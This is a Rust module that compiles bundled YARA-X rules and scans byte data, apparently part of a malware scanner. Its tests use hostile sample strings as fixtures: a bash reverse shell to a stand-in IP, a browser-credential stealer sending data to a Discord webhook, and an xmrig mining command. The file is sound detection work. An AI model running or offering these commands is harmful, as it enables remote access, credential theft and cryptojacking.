//! Curated YARA-X rules (rules/curated.yar), compiled once.

use std::sync::OnceLock;
use std::time::Duration;

static RULES: OnceLock<yara_x::Rules> = OnceLock::new();

fn rules() -> &'static yara_x::Rules {
    RULES.get_or_init(|| {
        let mut c = yara_x::Compiler::new();
        c.add_source(include_str!("../rules/curated.yar")).expect("bundled YARA rules compile");
        c.build()
    })
}

/// (rule identifier, description) for every rule matching `data`.
pub fn scan(data: &[u8]) -> Vec<(String, String)> {
    let mut s = yara_x::Scanner::new(rules());
    s.set_timeout(Duration::from_secs(20));
    let Ok(res) = s.scan(data) else { return vec![] };
    res.matching_rules()
        .map(|r| {
            let desc = r
                .metadata()
                .find(|(k, _)| *k == "description")
                .and_then(|(_, v)| if let yara_x::MetaValue::String(s) = v { Some(s.to_string()) } else { None })
                .unwrap_or_default();
            (r.identifier().to_string(), desc)
        })
        .collect()
}

#[cfg(test)]
mod tests {
    #[test]
    fn rules_match_only_with_several_indicators() {
        let hit = super::scan(b"read Login Data and Local State encrypted_key then post to https://discord.com/api/webhooks/1/x");
        assert_eq!(hit.iter().map(|h| h.0.as_str()).collect::<Vec<_>>(), vec!["jest_stealer_browser_webhook"]);
        assert!(super::scan(b"docs: Chrome keeps passwords in Login Data").is_empty());
        assert_eq!(super::scan(b"sh -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'")[0].0, "jest_reverse_shell");
        assert!(super::scan(b"xmrig --donate-level 1 -o stratum+tcp://pool:3333").iter().any(|h| h.0 == "jest_miner_xmrig"));
    }
}
